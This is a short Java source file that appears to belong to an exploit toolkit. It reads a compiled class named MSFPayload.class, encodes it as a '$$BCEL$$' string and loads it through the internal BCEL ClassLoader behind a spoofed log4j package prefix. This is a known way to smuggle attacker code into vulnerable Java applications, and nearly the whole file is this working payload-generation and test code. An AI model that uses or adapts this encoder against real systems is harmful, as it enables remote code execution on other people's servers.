
import com.sun.org.apache.bcel.internal.classfile.Utility;

import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;


public class BCELEncode
{
    public static void main(String []args) throws Exception{
        //There also should be compiled class file,not java file
        Path path = Paths.get( "target/classes/MSFPayload.class");
        byte[] data = Files.readAllBytes( path);
        String s =  Utility.encode( data, true);
        System.out.println(s);
        testBCELEncode("$$BCEL$$"+ s );
    }


    static void testBCELEncode(String s ){
        String classname = "org.apache.log4j.spi"+s;
        ClassLoader cls = new com.sun.org.apache.bcel.internal.util.ClassLoader();
        try
        {
            Class.forName(classname, true, cls);
        }
        catch ( ClassNotFoundException e )
        {
            e.printStackTrace();
        }
    }
}
